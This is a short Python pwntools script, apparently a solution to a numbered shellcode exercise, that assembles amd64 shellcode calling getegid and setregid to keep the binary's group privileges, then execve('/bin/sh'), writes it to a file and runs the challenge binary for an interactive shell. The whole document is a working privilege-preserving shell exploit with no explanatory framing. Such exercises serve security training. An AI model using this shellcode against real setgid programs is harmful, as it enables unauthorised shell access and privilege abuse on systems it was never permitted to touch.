#!/usr/bin/env python3
from pwn import *
from pwn import asm, context, gdb, process

context.clear(arch="amd64")
context.terminal = ["tmux", "splitw", "-h"]

# setregid(getegid(), getegid())
# getegid: 0x6c(%rax)
# setregid: 0x72(%rax) (%rdi = gid_t rgid, %rsi = gid_t rgid)
shellcode = asm(
    """
xor     rax, rax
add     rax, 108
syscall
mov     rdi, rax
mov     rsi, rax
xor     rax, rax
add     rax, 114
syscall
"""
)
# execve("/bin/sh", 0, 0)
# execve: 0x3b(%rax) (%rdi = const char *filename, %rsi = const char *const *argv, %rdx = const char *const *envp)
# /bin/sh = 2f62696e2f7368
shellcode += asm(
    """
xor     rax, rax
add     rax, 0x3b
xor     rdx, rdx
push    rdx
mov     rbx, 0x68732f6e69622f2f
push    rbx
mov     rdi, rsp
xor     rsi, rsi
xor     rdx, rdx
syscall
"""
)
with open("shellcode.bin", "wb") as shellcode_file:
    shellcode_file.write(shellcode)
io = process(["./4-nonzero-shellcode-64"])
# p = gdb.attach(
#     io,
#     """
# break *0x400aeb
# run
# """,
# )
io.interactive()
